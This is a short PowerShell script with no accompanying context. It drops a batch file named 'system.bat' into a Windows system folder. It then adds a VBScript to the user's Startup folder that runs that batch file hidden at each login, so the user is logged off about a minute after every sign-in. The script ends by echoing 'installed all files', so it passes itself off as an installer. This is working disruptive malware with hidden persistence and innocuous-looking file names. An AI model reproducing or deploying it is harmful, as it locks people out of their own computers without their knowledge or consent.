"ping -w 0 -n 60 127.0.0.0`nshutdown \l"| Out-File -FilePath "C:\ProgramData\Microsoft\Windows\system.bat" -encoding ascii
"Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run chr(34) & `"C:\ProgramData\Microsoft\Windows\system.bat`" & Chr(34), 0`nSet WshShell = Nothing"| Out-File -FilePath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\launcher.vbs" -encoding ascii
echo installed all files.
pause
